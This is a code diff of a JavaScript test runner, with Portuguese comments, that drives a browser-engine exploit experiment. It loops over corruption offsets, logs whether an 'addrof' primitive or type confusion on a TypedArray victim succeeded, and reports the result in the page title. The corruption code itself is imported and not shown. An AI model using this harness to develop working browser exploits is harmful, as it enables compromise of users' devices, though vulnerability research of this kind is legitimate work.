@@ -2,76 +2,60 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import { 
-    executeTypedArrayVictimAddrofTest_StableLogCapture,   // NOME DA FUNÇÃO ATUALIZADO
-    FNAME_MODULE_TYPEDARRAY_ADDROF_V10_SLC    // NOME DO MÓDULO ATUALIZADO
+    executeTypedArrayVictimAddrofTest_MultiOffsetCorruption,   // NOME DA FUNÇÃO ATUALIZADO
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC    // NOME DO MÓDULO ATUALIZADO
 } from './testArrayBufferVictimCrash.mjs';
 
 async function runHeisenbugReproStrategy_TypedArrayVictim() {
-    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_StableLogCapture";
-    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (StableLogCapture) ====`, 'test', FNAME_RUNNER);
+    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_MultiOffsetCorruption";
+    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiOffsetCorruption) ====`, 'test', FNAME_RUNNER);
 
-    const result = await executeTypedArrayVictimAddrofTest_StableLogCapture(); 
+    const result = await executeTypedArrayVictimAddrofTest_MultiOffsetCorruption(); 
 
-    if (result.errorOccurred) {
-        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
-        if (result.errorOccurred.name === 'RangeError') {
-            logS3(`     RangeError: Maximum call stack size exceeded OCORREU!`, "vuln", FNAME_RUNNER);
-            document.title = `Heisenbug (TypedArray-SLC) RangeError!`; // SLC para StableLogCapture
-         } else {
-            document.title = `Heisenbug (TypedArray-SLC) ERR: ${result.errorOccurred.name}`;
-         }
-    } else if (result.potentiallyCrashed) {
-         logS3(`   RESULTADO: CONGELAMENTO POTENCIAL. Detalhes da toJSON: ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "critical", FNAME_RUNNER);
-         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-SLC) CRASH/FREEZE?`;
+    if (result.errorOccurred) { // Erro principal no teste
+        logS3(`   RESULTADO: ERRO JS PRINCIPAL CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
+        document.title = `Heisenbug (TypedArray-MOC) MAIN ERR!`; 
+    } else if (result.iteration_results && result.iteration_results.length > 0) {
+        logS3(`   RESULTADO: Teste de Múltiplos Offsets Concluído. Verificando sucessos...`, "good", FNAME_RUNNER);
+        let anySuccess = false;
+        let firstSuccessfulOffset = null;
+        result.iteration_results.forEach(iter_res => {
+            if (iter_res.addrof_A.success || iter_res.addrof_B.success) {
+                anySuccess = true;
+                if (!firstSuccessfulOffset) firstSuccessfulOffset = iter_res.offset;
+                logS3(`     SUCESSO Addrof no Offset ${iter_res.offset}! A: ${iter_res.addrof_A.success}, B: ${iter_res.addrof_B.success}`, "vuln", FNAME_RUNNER);
+            }
+            if (iter_res.error) {
+                 logS3(`     ERRO na iteração do Offset ${iter_res.offset}: ${iter_res.error}`, "error", FNAME_RUNNER);
+            }
+        });
+
+        if (anySuccess) {
+            document.title = `Heisenbug (TypedArray-MOC) Addr SUCCESS @ ${firstSuccessfulOffset}!`;
+        } else {
+            // Verificar se houve alguma type confusion, mesmo sem addrof
+            let typeConfusionObserved = result.iteration_results.some(
+                ir => ir.probe_details && ir.probe_details.this_type_in_toJSON === "[object Object]"
+            );
+            if (typeConfusionObserved) {
+                document.title = `Heisenbug (TypedArray-MOC) TC OK, Addr Fail`;
+            } else {
+                document.title = `Heisenbug (TypedArray-MOC) Test OK/No TC`;
+            }
+        }
     } else {
-        logS3(`   RESULTADO: Completou. Detalhes da ÚLTIMA chamada da sonda (referência direta): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
-        logS3(`   Stringify Output: ${result.stringifyResult ? result.stringifyResult.substring(0, 200) + "..." : 'N/A'}`, "info", FNAME_RUNNER);
-        
-        let heisenbugObservedOnThisInProbe = false;
-        if (result.toJSON_details && result.toJSON_details.probe_called && 
-            result.toJSON_details.this_type_in_toJSON === "[object Object]") {
-            heisenbugObservedOnThisInProbe = true;
-        }
-
-        if (result.addrof_A_attempt_result && result.addrof_A_attempt_result.success) {
-             logS3(`     ADDROF A SUCESSO! ${result.addrof_A_attempt_result.message}`, "vuln", FNAME_RUNNER);
-        } else if (result.addrof_A_attempt_result) {
-             logS3(`     ADDROF A FALHOU: ${result.addrof_A_attempt_result.message}`, heisenbugObservedOnThisInProbe ? "warn" : "error", FNAME_RUNNER);
-        }
-        if (result.addrof_B_attempt_result && result.addrof_B_attempt_result.success) {
-             logS3(`     ADDROF B SUCESSO! ${result.addrof_B_attempt_result.message}`, "vuln", FNAME_RUNNER);
-        } else if (result.addrof_B_attempt_result) {
-             logS3(`     ADDROF B FALHOU: ${result.addrof_B_attempt_result.message}`, heisenbugObservedOnThisInProbe ? "warn" : "error", FNAME_RUNNER);
-        }
-
-        if (result.toJSON_details && result.toJSON_details.error_in_toJSON) {
-            logS3(`     ERRO INTERNO NA toJSON: ${result.toJSON_details.error_in_toJSON}`, "warn", FNAME_RUNNER);
-            document.title = `Heisenbug (TypedArray-SLC) toJSON_ERR`;
-        } else if (heisenbugObservedOnThisInProbe) {
-            logS3(`     !!!! TYPE CONFUSION NO 'this' DA SONDA OBSERVADA !!!! Tipo: ${result.toJSON_details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
-            if (result.toJSON_details.this_was_victim_ref_when_confused !== null) { 
-                logS3(`       Na sonda confusa, 'this' === victim_typed_array_ref_v10? ${result.toJSON_details.this_was_victim_ref_when_confused}`, "info");
-            }
-            if (result.toJSON_details.writes_attempted_on_confused_this) { 
-                 logS3(`       Escritas addrof tentadas no 'this' confuso: ${result.toJSON_details.writes_attempted_on_confused_this}`, "info");
-            }
-            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
-                 document.title = `Heisenbug (TypedArray-SLC) Sonda OK, Addr Falhou`;
-            }
-        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V10_SLC) || document.title.includes("Probing")) {
-            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
-                 document.title = `Heisenbug (TypedArray-SLC) Test OK`;
-            }
-        }
+        logS3(`   RESULTADO: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
+        document.title = `Heisenbug (TypedArray-MOC) No Results`;
     }
+
     logS3(`   Título da página: ${document.title}`, "info");
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Estratégia de Reprodução do Heisenbug com TypedArray Vítima (StableLogCapture) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiOffsetCorruption) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_SLC}_MainOrchestrator`; 
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}_MainOrchestrator`; 
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
@@ -79,16 +63,16 @@ export async function runAllAdvancedTestsS3() {
     if (outputDiv) outputDiv.innerHTML = '';
 
     logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
-    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (StableLogCapture) ====`, 'test', FNAME_ORCHESTRATOR);
+    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (MultiOffsetCorruption) ====`, 'test', FNAME_ORCHESTRATOR);
 
     await runHeisenbugReproStrategy_TypedArrayVictim();
 
     logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     if (runBtn) runBtn.disabled = false;
 
-    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V10_SLC)) {
-        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && !document.title.includes("SUCCESS") && !document.title.includes("ERR") && !document.title.includes("TYPE CONFUSION")) {
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_SLC} Concluído`;
+    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC)) {
+        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && !document.title.includes("SUCCESS") && !document.title.includes("ERR") && !document.title.includes("TC OK")) {
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC} Concluído`;
         }
     }
 }
